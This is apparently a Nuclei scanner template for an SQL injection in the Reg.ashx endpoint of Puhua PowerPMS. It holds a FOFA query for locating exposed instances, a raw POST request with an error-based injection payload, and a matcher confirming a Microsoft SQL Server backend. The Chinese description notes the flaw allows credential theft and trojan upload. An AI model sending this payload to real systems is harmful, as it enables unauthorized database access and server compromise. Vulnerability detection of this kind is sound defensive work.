id: powerpms-reg-sqli
info:
  name: 普华Powerpms Reg.ashx SQL注入漏洞
  author: leadlife
  severity: high
  description: 普华PowerPMS是上海普华科技发展股份有限公司旗下一款项目管理信息平台。其PowerPMS系统Reg.ashx接口存在SQL注入漏洞，攻击者除了可以利用SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限
  reference: 
    - https://www.yuque.com/lvguo-pibd8/fqbwsx/smn142gqwkgrbovn
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
    tips:
    repair:
    version:
  tags: powerpms,sqli

http:
  - raw:
      - |
        POST /weixin3.0/Reg.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 23

        hum=1'and+1<@@VERSION--
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'Microsoft SQL Server')
        condition: and